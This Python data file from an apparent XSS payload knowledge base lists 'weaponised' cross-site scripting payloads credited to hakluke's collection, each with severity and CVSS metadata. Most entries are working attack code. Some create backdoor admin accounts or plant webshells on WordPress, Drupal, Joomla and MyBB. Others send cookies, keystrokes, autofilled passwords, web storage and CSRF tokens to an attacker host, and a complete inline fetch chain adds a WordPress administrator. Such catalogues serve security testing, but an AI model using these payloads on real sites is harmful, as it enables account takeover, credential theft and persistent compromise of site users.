#!/usr/bin/env python3

"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-27 UTC
Status: Created
Telegram: https://t.me/EasyProTech

Weaponised XSS payloads from hakluke/weaponised-XSS-payloads.
High-impact exploitation payloads for CMS platforms.
Source: https://github.com/hakluke/weaponised-XSS-payloads
"""

from ..models import AttackSurface, Encoding, PayloadEntry, Reliability, Severity


HAKLUKE_WEAPONISED_PAYLOADS = {
    # WordPress Admin User Creation
    "hakluke-wordpress-create-admin": PayloadEntry(
        payload='<script src="https://ATTACKER_URL/wordpress_create_admin_user.js"></script>',
        contexts=["html_content", "javascript"],
        severity=Severity.CRITICAL,
        cvss_score=9.8,
        description="WordPress XSS to admin user creation. Creates backdoor admin account via REST API.",
        tags=["hakluke", "weaponised", "wordpress", "admin-creation", "account-takeover", "cms"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
        attack_surface=AttackSurface.WEB,
        tested_on=["wordpress"],
    ),
    # WordPress RCE via Plugin Editor
    "hakluke-wordpress-rce": PayloadEntry(
        payload='<script src="https://ATTACKER_URL/wordpress_rce.js"></script>',
        contexts=["html_content", "javascript"],
        severity=Severity.CRITICAL,
        cvss_score=10.0,
        description="WordPress XSS to RCE. Exploits plugin editor to inject PHP webshell.",
        tags=["hakluke", "weaponised", "wordpress", "rce", "webshell", "critical"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
        attack_surface=AttackSurface.WEB,
        tested_on=["wordpress"],
    ),
    # WordPress Create Post
    "hakluke-wordpress-create-post": PayloadEntry(
        payload='<script src="https://ATTACKER_URL/wordpress_create_post.js"></script>',
        contexts=["html_content", "javascript"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="WordPress XSS to create arbitrary posts. Can be used for defacement or stored XSS.",
        tags=["hakluke", "weaponised", "wordpress", "create-post", "defacement"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
        attack_surface=AttackSurface.WEB,
        tested_on=["wordpress"],
    ),
    # WordPress Create Page
    "hakluke-wordpress-create-page": PayloadEntry(
        payload='<script src="https://ATTACKER_URL/wordpress_create_page.js"></script>',
        contexts=["html_content", "javascript"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="WordPress XSS to create arbitrary pages. Enables persistent XSS or phishing pages.",
        tags=["hakluke", "weaponised", "wordpress", "create-page", "stored-xss"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
        attack_surface=AttackSurface.WEB,
        tested_on=["wordpress"],
    ),
    # Drupal Admin User Creation
    "hakluke-drupal-create-admin": PayloadEntry(
        payload='<script src="https://ATTACKER_URL/drupal_create_admin_user.js"></script>',
        contexts=["html_content", "javascript"],
        severity=Severity.CRITICAL,
        cvss_score=9.8,
        description="Drupal XSS to admin user creation. Creates backdoor admin account.",
        tags=["hakluke", "weaponised", "drupal", "admin-creation", "account-takeover", "cms"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
        attack_surface=AttackSurface.WEB,
        tested_on=["drupal"],
    ),
    # Joomla Admin User Creation
    "hakluke-joomla-create-admin": PayloadEntry(
        payload='<script src="https://ATTACKER_URL/joomla_create_admin_user.js"></script>',
        contexts=["html_content", "javascript"],
        severity=Severity.CRITICAL,
        cvss_score=9.8,
        description="Joomla XSS to admin user creation. Creates backdoor Super User account.",
        tags=["hakluke", "weaponised", "joomla", "admin-creation", "account-takeover", "cms"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
        attack_surface=AttackSurface.WEB,
        tested_on=["joomla"],
    ),
    # MyBB Admin User Creation
    "hakluke-mybb-create-admin": PayloadEntry(
        payload='<script src="https://ATTACKER_URL/mybb_create_admin_user.js"></script>',
        contexts=["html_content", "javascript"],
        severity=Severity.CRITICAL,
        cvss_score=9.8,
        description="MyBB forum XSS to admin user creation. Creates backdoor admin account.",
        tags=["hakluke", "weaponised", "mybb", "forum", "admin-creation", "account-takeover"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
        attack_surface=AttackSurface.WEB,
        tested_on=["mybb"],
    ),
    # Staged XSS Loader
    "hakluke-staged-xss": PayloadEntry(
        payload='<script src="https://ATTACKER_URL/staged-xss.js"></script>',
        contexts=["html_content", "javascript"],
        severity=Severity.HIGH,
        cvss_score=8.0,
        description="Staged XSS loader template. Loads second-stage payload for complex attacks.",
        tags=["hakluke", "weaponised", "staged", "loader", "modular"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
        attack_surface=AttackSurface.CLIENT,
    ),
    # iframe Template for Phishing/Clickjacking
    "hakluke-iframe-template": PayloadEntry(
        payload='<script src="https://ATTACKER_URL/iframe_template.js"></script>',
        contexts=["html_content", "javascript"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="iframe injection template for phishing or clickjacking attacks.",
        tags=["hakluke", "weaponised", "iframe", "phishing", "clickjacking"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
        attack_surface=AttackSurface.CLIENT,
    ),
    # API Key Extraction
    "hakluke-apikey-extraction": PayloadEntry(
        payload='<script>fetch("https://ATTACKER_URL/log?key="+btoa(document.body.innerHTML))</script>',
        contexts=["html_content", "javascript"],
        severity=Severity.HIGH,
        cvss_score=8.0,
        description="API key extraction via XSS. Exfiltrates page content containing API keys.",
        tags=["hakluke", "weaponised", "apikey", "exfiltration", "secrets"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
        attack_surface=AttackSurface.CLIENT,
    ),
    # Generic CMS Admin Takeover Pattern
    "hakluke-cms-admin-takeover-fetch": PayloadEntry(
        payload='fetch("/wp-admin/user-new.php").then(r=>r.text()).then(t=>{var n=t.match(/_wpnonce_create-user.*?value="(.*?)"/)[1];fetch("/wp-admin/user-new.php",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"action=createuser&_wpnonce_create-user="+n+"&user_login=hacker&email=hacker@evil.com&pass1=Hacked123!&pass2=Hacked123!&role=administrator&createuser=Add+New+User"})})',
        contexts=["javascript"],
        severity=Severity.CRITICAL,
        cvss_score=9.8,
        description="WordPress admin creation via fetch API. Inline payload without external script.",
        tags=["hakluke", "weaponised", "wordpress", "admin-creation", "fetch", "inline"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
        attack_surface=AttackSurface.WEB,
        tested_on=["wordpress"],
    ),
    # Cookie Exfiltration with Session Hijack
    "hakluke-session-hijack": PayloadEntry(
        payload='<script>new Image().src="https://ATTACKER_URL/steal?c="+document.cookie</script>',
        contexts=["html_content"],
        severity=Severity.HIGH,
        cvss_score=8.5,
        description="Session hijacking via cookie exfiltration. Classic but effective.",
        tags=["hakluke", "weaponised", "cookie-stealing", "session-hijack"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
        attack_surface=AttackSurface.CLIENT,
    ),
    # Keylogger Injection
    "hakluke-keylogger": PayloadEntry(
        payload='<script>document.onkeypress=function(e){new Image().src="https://ATTACKER_URL/log?k="+e.key}</script>',
        contexts=["html_content", "javascript"],
        severity=Severity.CRITICAL,
        cvss_score=9.0,
        description="Keylogger injection via XSS. Captures all keystrokes on the page.",
        tags=["hakluke", "weaponised", "keylogger", "credential-theft"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
        attack_surface=AttackSurface.CLIENT,
    ),
    # Form Hijacking
    "hakluke-form-hijack": PayloadEntry(
        payload='<script>document.forms[0].action="https://ATTACKER_URL/phish"</script>',
        contexts=["html_content", "javascript"],
        severity=Severity.CRITICAL,
        cvss_score=9.0,
        description="Form action hijacking. Redirects form submissions to attacker server.",
        tags=["hakluke", "weaponised", "form-hijack", "phishing", "credential-theft"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
        attack_surface=AttackSurface.CLIENT,
    ),
    # Password Manager Autofill Theft
    "hakluke-password-autofill-theft": PayloadEntry(
        payload='<script>setTimeout(function(){var p=document.querySelector("input[type=password]");if(p&&p.value)new Image().src="https://ATTACKER_URL/pw?p="+btoa(p.value)},3000)</script>',
        contexts=["html_content", "javascript"],
        severity=Severity.CRITICAL,
        cvss_score=9.5,
        description="Password manager autofill theft. Waits for autofill then exfiltrates.",
        tags=["hakluke", "weaponised", "password-theft", "autofill", "credential-theft"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=False,
        attack_surface=AttackSurface.CLIENT,
    ),
    # localStorage/sessionStorage Theft
    "hakluke-storage-theft": PayloadEntry(
        payload='<script>fetch("https://ATTACKER_URL/storage",{method:"POST",body:JSON.stringify({local:localStorage,session:sessionStorage})})</script>',
        contexts=["html_content", "javascript"],
        severity=Severity.HIGH,
        cvss_score=8.0,
        description="Web Storage exfiltration. Steals localStorage and sessionStorage data.",
        tags=["hakluke", "weaponised", "storage-theft", "localstorage", "sessionstorage"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
        attack_surface=AttackSurface.CLIENT,
    ),
    # CSRF Token Extraction and Abuse
    "hakluke-csrf-extraction": PayloadEntry(
        payload='<script>var t=document.querySelector("input[name=csrf_token]").value;fetch("https://ATTACKER_URL/csrf?t="+t)</script>',
        contexts=["html_content", "javascript"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="CSRF token extraction via XSS. Enables chained CSRF attacks.",
        tags=["hakluke", "weaponised", "csrf", "token-extraction", "chaining"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
        attack_surface=AttackSurface.CLIENT,
    ),
    # DOM-based Redirect to Phishing
    "hakluke-redirect-phishing": PayloadEntry(
        payload='<script>location="https://ATTACKER_URL/phish?origin="+encodeURIComponent(location.href)</script>',
        contexts=["html_content", "javascript"],
        severity=Severity.MEDIUM,
        cvss_score=6.5,
        description="Redirect to phishing page with original URL for context.",
        tags=["hakluke", "weaponised", "redirect", "phishing"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
        attack_surface=AttackSurface.CLIENT,
    ),
    # Service Worker Registration for Persistence
    "hakluke-service-worker-persistence": PayloadEntry(
        payload='<script>navigator.serviceWorker.register("https://ATTACKER_URL/sw.js",{scope:"/"})</script>',
        contexts=["html_content", "javascript"],
        severity=Severity.CRITICAL,
        cvss_score=9.5,
        description="Service Worker registration for persistent XSS. Survives page refresh.",
        tags=["hakluke", "weaponised", "service-worker", "persistence", "advanced"],
        reliability=Reliability.LOW,
        encoding=Encoding.NONE,
        waf_evasion=False,
        attack_surface=AttackSurface.CLIENT,
    ),
}
